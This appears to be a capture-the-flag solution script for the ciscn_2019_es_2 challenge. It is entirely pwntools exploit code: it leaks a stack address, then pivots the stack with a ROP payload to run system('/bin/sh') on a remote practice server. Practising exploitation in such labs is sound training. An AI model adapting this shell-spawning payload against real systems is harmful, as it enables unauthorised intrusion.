#Made by fly_autumn
#x86 stack_pivoting + ret2rop
from pwn import *
#p = process("./ciscn_2019_es_2")
p = remote("node5.buuoj.cn",25714)
elf = ELF("./ciscn_2019_es_2")
context(os="linux",arch="i386")

offset = 44
sys_plt = 0x8048400
hack_plt = 0x804854b
leave_ret = 0x8048562 

payload1 = b"A"*40
p.send(payload1)
p.recvuntil(b"A"*40)
stack_addr = u32(p.recv(4)) - 0x38
log.success("stack addr: "+hex(stack_addr))

payload2 = b"AAAA" + p32(sys_plt) + p32(hack_plt) + p32(stack_addr + 0x10) + b"/bin/sh\n" + b"A"*(40-6*4) + p32(stack_addr) + p32(leave_ret)
p.recv()
p.sendline(payload2)

p.interactive()
